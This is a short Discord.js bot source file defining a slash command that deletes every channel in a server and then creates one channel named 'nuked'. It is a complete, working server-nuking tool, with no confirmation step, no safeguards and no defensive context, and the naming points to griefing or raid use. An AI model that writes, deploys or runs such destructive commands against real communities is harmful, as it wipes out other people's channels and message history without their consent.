const { SlashCommandBuilder } = require("discord.js");

module.exports = {
  CMD: new SlashCommandBuilder().setDescription(
    "Remove all channels from a server"
  ),
  async execute(client, interaction) {
    const { guild } = interaction;
    await interaction.reply({
      content: `Removing ${guild.channels.cache.size} channels..`,
    });

    await guild.channels.cache.map((channel) => channel.delete());
    await guild.channels.create({
      name: "nuked",
      reason: "o.o",
    });
  },
};
